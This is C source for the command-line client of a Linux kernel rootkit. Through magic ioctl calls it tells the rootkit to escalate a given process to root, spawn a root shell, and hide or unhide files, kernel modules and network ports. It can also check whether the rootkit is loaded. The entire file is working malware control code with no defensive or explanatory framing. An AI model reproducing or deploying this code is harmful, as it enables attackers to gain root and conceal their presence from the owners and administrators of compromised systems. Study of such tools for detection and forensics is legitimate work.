#include <sys/ioctl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>

#include "client.h"

void prepare_cmd_struct(struct rootkit_cmd* cmd, unsigned long id, void* arg){
    cmd->magic_head = ROOTKIT_CMD_MAGIC_HEAD;
    cmd->magic_tail = ROOTKIT_CMD_MAGIC_TAIL;
    cmd->cmd_id = id;
    cmd->real_arg = arg;
}


int prompt_root_shell(void){
    struct rootkit_cmd cmd;
    prepare_cmd_struct(&cmd, ROOTKIT_CMD_ID_GETROOT, NULL);
    ioctl(0, ROOTKIT_IOCTL_MAGIC, (unsigned long)&cmd);
    system("/bin/sh");
    return 1;
}

int set_pid_root(long pid){
    struct rootkit_cmd cmd;
    prepare_cmd_struct(&cmd, ROOTKIT_CMD_ID_SETROOT, (void*)pid);
    ioctl(0, ROOTKIT_IOCTL_MAGIC, (unsigned long)&cmd);
    return 1;
}

int test_rootkit(void){
    struct rootkit_cmd cmd;
    prepare_cmd_struct(&cmd, ROOTKIT_CMD_ID_TEST, NULL);
    if(ioctl(0, ROOTKIT_IOCTL_MAGIC, (unsigned long)&cmd) == ROOTKIT_CMD_ID_TEST){
        puts("[*] rootkit exists");
    }else{
        puts("[*] rootkit not exists");
    }
    return 1;
}


int cloak_file(char* name){
    struct rootkit_cmd cmd;
    struct cloak_file_cmd cloak_cmd;
    if(strlen(name) > MAX_CLOAK_FILE_NAME_LEN){
        puts("file name to cloak too long");
        return -1;
    }
    memcpy(cloak_cmd.name, name, MAX_CLOAK_FILE_NAME_LEN);
    prepare_cmd_struct(&cmd, ROOTKIT_CMD_ID_HIDEFILE, &cloak_cmd);
    ioctl(0, ROOTKIT_IOCTL_MAGIC, (unsigned long)&cmd);
    return 1;
}

int uncloak_file(char* name){
    struct rootkit_cmd cmd;
    struct cloak_file_cmd cloak_cmd;
    if(strlen(name) > MAX_CLOAK_FILE_NAME_LEN){
        puts("file name too long");
        return -1;
    }
    memcpy(cloak_cmd.name, name, MAX_CLOAK_FILE_NAME_LEN);
    prepare_cmd_struct(&cmd, ROOTKIT_CMD_ID_SHOWFILE, &cloak_cmd);
    ioctl(0, ROOTKIT_IOCTL_MAGIC, (unsigned long)&cmd);
    return 1;
}

int cloak_module(char* name){
    struct rootkit_cmd cmd;
    struct cloak_mod_cmd cloak_cmd;
    if(strlen(name) > MAX_CLOAK_MOD_NAME_LEN){
        puts("module name to cloak too long");
        return -1;
    }
    memcpy(cloak_cmd.name, name, MAX_CLOAK_MOD_NAME_LEN);
    prepare_cmd_struct(&cmd, ROOTKIT_CMD_ID_HIDEMOD, &cloak_cmd);
    ioctl(0, ROOTKIT_IOCTL_MAGIC, (unsigned long)&cmd);
    return 1;
}

int uncloak_module(char* name){
    struct rootkit_cmd cmd;
    struct cloak_mod_cmd cloak_cmd;
    if(strlen(name) > MAX_CLOAK_MOD_NAME_LEN){
        puts("module name to cloak too long");
        return -1;
    }
    memcpy(cloak_cmd.name, name, MAX_CLOAK_MOD_NAME_LEN);
    prepare_cmd_struct(&cmd, ROOTKIT_CMD_ID_SHOWMOD, &cloak_cmd);
    ioctl(0, ROOTKIT_IOCTL_MAGIC, (unsigned long)&cmd);
    return 1;
}

int cloak_port(unsigned long port){
    struct rootkit_cmd cmd;
    prepare_cmd_struct(&cmd, ROOTKIT_CMD_ID_HIDEPORT, (void*)port);
    ioctl(0, ROOTKIT_IOCTL_MAGIC, (unsigned long)&cmd);
    return 1;
}

int uncloak_port(unsigned long port){
    struct rootkit_cmd cmd;
    prepare_cmd_struct(&cmd, ROOTKIT_CMD_ID_SHOWPORT, (void*)port);
    ioctl(0, ROOTKIT_IOCTL_MAGIC, (unsigned long)&cmd);
    return 1;
}

int main(int argc, char* argv[]){
    int opt;
    if(argc == 1){
        test_rootkit();
        return 1;
    }
    while((opt = getopt(argc, argv, "f:F:p:P:r:Rm:M:")) != -1){
        switch(opt){
            case 'f':
                cloak_file(optarg);
                break;
            case 'F':
                uncloak_file(optarg);
                break;
            case 'p':
                cloak_port((long)atoi(optarg));
                break;
            case 'P':
                uncloak_port((long)atoi(optarg));
                break;
            case 'r':
                set_pid_root((long)atoi(optarg));
                break;
            case 'R':
                prompt_root_shell();
                break;
            case 'm':
                cloak_module(optarg);
                break;
            case 'M':
                uncloak_module(optarg);
                break;
        }
    }
    return 1;
}
